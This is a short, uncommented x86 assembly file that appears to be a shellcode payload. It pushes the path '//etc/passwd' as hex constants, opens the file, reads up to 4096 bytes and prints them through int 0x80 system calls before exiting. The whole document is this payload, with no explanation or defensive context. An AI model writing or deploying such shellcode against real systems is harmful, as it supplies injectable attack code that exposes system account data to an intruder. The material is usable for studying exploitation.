global _start

section .text

_start:
  xor rcx, rcx
  mul rcx

open:
  mov al, 0x05
  push rcx
  push 0x64777373
  push 0x61702f63
  push 0x74652f2f
  mov rbx, rsp
  int 0x80

read:
  xchg rax, rbx
  xchg rax, rcx
  mov al, 0x03
  mov dx, 0x0FFF
  inc rdx
  int 0x80

write:
  xchg rax, rdx
  mov bl, 0x01
  shr rax, 0x0A
  int 0x80

exit:
  xchg rax, rbx
  int 0x80

